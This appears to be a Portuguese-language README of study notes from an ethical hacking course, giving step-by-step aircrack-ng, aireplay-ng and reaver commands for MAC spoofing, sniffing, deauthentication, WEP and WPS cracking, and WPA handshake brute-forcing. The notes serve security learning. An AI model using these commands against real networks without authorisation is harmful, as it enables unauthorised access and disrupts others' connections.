
# [Ethical Hacking](https://www.udemy.com/course/learn-ethical-hacking-from-scratch)

Mudar o layout do teclado do kali para pt-br
```
setxkbmap -model abnt2 -layout br
```

# Requirements

Aircrack-ng e Reaver
```
sudo apt install net-tools aircrack-ng reaver 
```

Bettercap

### Instalar o GO

Seguir tutorial desse [link](https://tzusec.com/how-to-install-golang-in-kali-linux/). Nele, na etapa de colar as variáveis de ambiente, ao invés de colar no ~/.bashrc, colar no ~/.zshrc. Depois esecutar **source ~/.zshrc**

### Instalar bettercap
```
go get github.com/bettercap/bettercap
# path do executável: $GOPATH/bin/bettercap
# ele já estará adicionado ao path, basta executar o bettercap
```


## Sumário

- [Change MAC](#change-mac)
- [Get MAC](#get-mac)
- [Monitor Mode](#monitor-mode)
- [Sniffing com Airodump-ng](#sniffing-com-airodump-ng)
- Attacks
    - [Deauthentication Attack](#deauthentication-attack)
    - [Fake Authentication Attack](#fake-authentication-attack)
    - [ARP Request Replay Attack](#arp-request-replay-attack)
- Wi-Fi
    - [WEP cracking](#wi-fi-wep-cracking)
    - [WPS cracking](#wi-fi-wps-cracking)
    - [WPA/WPA2 cracking](#wi-fi-wpawpa2-cracking)
- [Bettercap](#arp-spoofing)
#

## Change MAC 

```
ifconfig wlan1 down
ifconfig wlan1 hw ether A0:B1:C2:D3:E4:F5
ifconfig wlan1 up
```

## Get MAC

```
ifconfig -a wlan1 | grep ether
```

#

## Monitor Mode

```
ifconfig wlan1 down
iwconfig wlan1 mode monitor
ifconfig wlan1 up
```
#

## Sniffing com Airodump-ng

Utilizado para sniffar redes wi-fis

|||
|-|-|
|BSSID|mac|
|PWR|força do sinal|
|Beacons|broadcast existencia da rede|
|#Data|total de dados trafegados|
|#/s|total de dados trafegados por segundo|
|CH|canal da rede|
|MB|velocidade máxima suportada|
|ENC|encriptação da rede|
|CIPHER|cifra da rede|
|AUTH|autenticação utilizada|
|ESSID|nome da rede|
|STATION|cliente conectado na rede|


### Todas as Redes
```
airodump-ng wlan1
```

### Rede espefífica
```
airodump-ng --channel [canal] --bssid [mac] wlan1
```

### Salvar dados
```
airodump-ng --channel [canal] --bssid [mac] --write [output file] wlan1
```

#

## Deauthentication Attack

Desautentica um cliente de uma dada rede, sem precisar estar conectado na mesma

1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)

2. [Sniffar o Wi-Fi alvo](#rede-espefífica). Deixe este terminal aberto

3. Executar ataque
    ```
    aireplay-ng --deauth 10000000 -a [bssid wi-fi] -c [mac client] wlan1
    ```
#

## Fake Authentication Attack

Se associa a um Wi-Fi, enviando pacotes de autenticação falsos, para aumentar o número de pacotes tráfegados. Utilizado em ataque como [WEP cracking](#wep-cracking).

1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)

2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto

3. Abra outro terminal e execute o ataque
    -  **num attempts**: número de vezes que o ataque será executado
    - **mac wifi adapter**: mac da interface em modo monitor
    ```
    aireplay-ng --fakeauth [num attempts] -a [bssid wi-fi] -h [mac wifi adapter] wlan1
    ```

#

## ARP Request Replay Attack 

Gera vários pacotes de ARP Request, utilizados para associar um IP a um dado MAC. Utilizado em ataques como [Wi-Fi WEP cracking](#wi-fi-wep-cracking), para forçar a criação de novos IVs. 

1. Associe-se ao wifi alvo, por meio do [Fake Auth Attack](#fake-authentication-attack)

3. Abra outro terminal e execute o ataque 
    - **mac wifi adapter**: mac da interface em modo monitor
    ```
    aireplay-ng --arpreplay -b [bssid wi-fi] -h [mac wifi adapter] wlan1
    ```

#

## Wi-Fi WEP cracking

Utiliza os IVs trafegados nos pacotes da rede Wi-Fi, para tentar descobrir sua senha. 

1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)

2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto.

3. **[Situacional]** Se o número de pacotes trafegados for baixo, execute o [ARP Request Replay Attack](#arp-request-replay-attack) antes do comando abaixo

3. Abra outro terminal e execute o ataque. O  sniffing_file.cap é a captura gerada no passo 2 ou 3
    ```
    aircrack-ng sniffing_file.cap
    ```
#

## Wi-Fi WPS cracking

1. Verificar se alvo tem wps habilitado
    ```
    wash --interface wlan1
    ```

2. Executar Fake Auth com multiplas tentativas
    ```
    aireplay-ng --fakeauth 100 -a [bssid wi-fi] -h [mac wifi adapter] wlan1
    ```
3. Abra outro Terminal e execute o ataque
    ```
    reaver -vvv --no-associate --bssid [bssid wi-fi] --channel [channel wi-fi] --interface wlan1
    ```
#

## Wi-Fi WPA/WPA2 cracking

Captura o Handshake de um client com o Wi-Fi e exploita essa informação para tentar quebrar a senha a partir de uma lista de senhas (Método força bruta).

1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)

2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto.

3. Num novo terminal, desautentique um client deste wi-fi, forçando-o a criar um novo handshake
    ```
    aireplay-ng --deauth 4 -a [bssid wi-fi] -c [mac client] wlan1
    ```
4. Interromper sniffing do passo 2 quando o handshake for capturado

5. Executar ataque 
    > [senhas rockyou.txt](https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt)

    > wordlist.txt é a lista de senhas

    ```
    aircrack-ng sniffing_file.cap -w wordlist.txt
    ```

#

# Bettercap

## ARP Spoofing

TODO





